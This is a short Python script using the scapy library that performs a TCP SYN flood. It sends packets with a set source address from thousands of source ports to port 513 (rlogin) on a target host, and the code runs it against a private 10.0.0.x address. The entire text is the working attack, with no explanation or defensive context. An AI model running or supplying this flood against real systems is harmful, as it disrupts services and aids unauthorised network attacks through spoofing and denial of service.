from scapy.all import *
def synFlood(src, tgt):
    for sport in range(1024,65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

src = "10.0.0.133"
tgt = "10.0.0.155"
synFlood(src, tgt)

